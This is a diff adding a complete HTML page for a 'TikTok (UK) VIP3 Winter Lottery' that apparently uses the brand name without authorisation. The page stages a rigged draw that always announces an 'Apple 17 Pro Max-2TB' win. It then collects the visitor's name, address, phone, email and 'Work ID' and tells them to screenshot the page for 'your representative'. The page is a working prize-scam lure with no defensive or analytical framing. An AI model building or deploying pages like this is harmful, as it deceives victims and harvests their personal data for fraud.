@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok (UK) VIP3 Winter Lottery</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+
+        .container {
+            width: 85%;
+            margin: 0 auto;
+            padding: 50px 0;
+            text-align: center;
+        }
+
+        .header {
+            background-color: #0052CC;
+            color: #fff;
+            padding: 30px 20px;
+            border-radius: 10px;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            letter-spacing: 1px;
+        }
+
+        .prize-container {
+            display: flex;
+            justify-content: space-around;
+            margin: 50px 0;
+        }
+
+        .prize-item {
+            background-color: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 18%;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .prize-item:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15);
+        }
+
+        .prize-item img {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+
+        .prize-item h3 {
+            margin-top: 15px;
+            font-size: 1.3em;
+            color: #0052CC;
+        }
+
+        .prize-item p {
+            font-size: 1em;
+            color: #555;
+        }
+
+        .confirm-btn {
+            background-color: #0052CC;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.2em;
+            cursor: pointer;
+            margin-top: 40px;
+            transition: transform 0.3s ease;
+        }
+
+        .confirm-btn:hover {
+            transform: scale(1.05);
+            background-color: #003b8c;
+        }
+
+        .sign-area {
+            display: none;
+            margin-top: 50px;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .signature-box {
+            width: 100%;
+            height: 200px;
+            border: 2px solid #ccc;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            transition: border-color 0.3s ease;
+            font-size: 1.2em;
+            padding: 10px;
+        }
+
+        .signature-box:focus {
+            border-color: #0052CC;
+        }
+
+        .start-btn {
+            background-color: #28a745;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.2em;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+
+        .start-btn:hover {
+            transform: scale(1.05);
+            background-color: #218838;
+        }
+
+        .thank-you {
+            display: none;
+            background-color: #f9f9f9;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            margin-top: 40px;
+        }
+
+        .thank-you h2 {
+            font-size: 2em;
+            color: #28a745;
+        }
+
+        .submit-btn {
+            background-color: #0052CC;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.2em;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: transform 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            transform: scale(1.05);
+            background-color: #003b8c;
+        }
+
+        .form-container {
+            display: none;
+            margin-top: 20px;
+            background-color: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-container input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1em;
+        }
+
+        .motivational-text {
+            font-style: italic;
+            margin-top: 30px;
+            font-size: 1.2em;
+        }
+
+        .confetti {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.2);
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        .confetti .confetti-piece {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: #28a745;
+            border-radius: 50%;
+            animation: fall 1.5s ease-in-out infinite;
+        }
+
+        @keyframes fall {
+            0% {
+                top: -10px;
+                left: 50%;
+            }
+            100% {
+                top: 100%;
+                left: random(0, 100%);
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1>Welcome to TikTok (UK) Winter VIP3 Lottery Event</h1>
+    </div>
+
+    <div class="prize-container">
+        <div class="prize-item">
+            <img src="path/to/your/image1.png" alt="Smart Home Set">
+            <h3>1️⃣ Smart Home Set</h3>
+            <p>Make your home smarter and more stylish!</p>
+        </div>
+        <div class="prize-item">
+            <img src="path/to/your/image2.png" alt="British Brand Fashion Accessories">
+            <h3>2️⃣ British Brand Fashion Accessories</h3>
+            <p>Showcase iconic British designs!</p>
+        </div>
+        <div class="prize-item">
+            <img src="path/to/your/image3.png" alt="Premium Skincare Sets">
+            <h3>3️⃣ Premium Skincare Sets</h3>
+            <p>Luxurious care that will make you glow every day!</p>
+        </div>
+        <div class="prize-item">
+            <img src="path/to/your/image4.png" alt="Classic British Tea Set">
+            <h3>4️⃣ Classic British Tea Set</h3>
+            <p>Enjoy authentic British tea culture!</p>
+        </div>
+        <div class="prize-item">
+            <img src="path/to/your/image5.jpg" alt="Mystery Grand Prize">
+            <h3>5️⃣ Mystery Grand Prize</h3>
+            <p>More surprise gifts to elevate your VIP status!</p>
+        </div>
+    </div>
+
+    <button class="confirm-btn" onclick="startSign()">Confirm and Start</button>
+
+    <div class="sign-area" id="sign-area">
+        <h2>Sign your name to proceed with the lottery:</h2>
+        <textarea class="signature-box" id="signature-box" placeholder="Sign here..."></textarea>
+        <button class="start-btn" id="start-btn" onclick="startLottery()" disabled>Start Lottery</button>
+    </div>
+
+    <div class="thank-you" id="thank-you">
+        <h2>Congratulations! You've won the Mystery Grand Prize 🎉</h2>
+        <img src="path/to/your/image5.jpg" alt="Apple 17 Pro Max-2TB">
+        <p>You've won an Apple 17 Pro Max-2TB!</p>
+        <button class="submit-btn" onclick="fillForm()">Confirm Prize</button>
+    </div>
+
+    <div class="form-container" id="form-container">
+        <h2>Fill out your details for shipping:</h2>
+        <input type="text" placeholder="Recipient Name" id="name">
+        <input type="text" placeholder="Street Address" id="address">
+        <input type="text" placeholder="City/Town" id="city">
+        <input type="text" placeholder="Postal Code" id="postal">
+        <input type="text" placeholder="Phone Number" id="phone">
+        <input type="email" placeholder="Email Address" id="email">
+        <input type="text" placeholder="Work ID" id="work-id">
+        <button class="submit-btn" onclick="submitForm()">Submit</button>
+    </div>
+
+    <div class="motivational-text" id="motivational-text"></div>
+</div>
+
+<div class="confetti" id="confetti"></div>
+
+<script>
+    function startSign() {
+        document.getElementById('sign-area').style.display = 'block';
+    }
+
+    function startLottery() {
+        const signature = document.getElementById('signature-box').value;
+        if (signature.trim()) {
+            document.getElementById('sign-area').style.display = 'none';
+            document.getElementById('thank-you').style.display = 'block';
+            showConfetti();
+        } else {
+            alert("Please sign your name first!");
+        }
+    }
+
+    function fillForm() {
+        document.getElementById('form-container').style.display = 'block';
+    }
+
+    function submitForm() {
+        const name = document.getElementById('name').value;
+        const address = document.getElementById('address').value;
+        const city = document.getElementById('city').value;
+        const postal = document.getElementById('postal').value;
+        const phone = document.getElementById('phone').value;
+        const email = document.getElementById('email').value;
+        const workId = document.getElementById('work-id').value;
+
+        if (name && address && city && postal && phone && email && workId) {
+            alert("Your information has been submitted successfully! Please screenshot this page and send it to your representative.");
+            document.getElementById('motivational-text').innerHTML = "Keep pushing forward, success is just around the corner!";
+        } else {
+            alert("Please fill out all fields.");
+        }
+    }
+
+    function showConfetti() {
+        const confetti = document.getElementById('confetti');
+        confetti.style.display = 'block';
+        for (let i = 0; i < 100; i++) {
+            const confettiPiece = document.createElement('div');
+            confettiPiece.classList.add('confetti-piece');
+            confettiPiece.style.animationDelay = `${Math.random() * 2}s`;
+            confettiPiece.style.left = `${Math.random() * 100}%`;
+            confetti.appendChild(confettiPiece);
+        }
+    }
+</script>
+
+</body>
+</html>
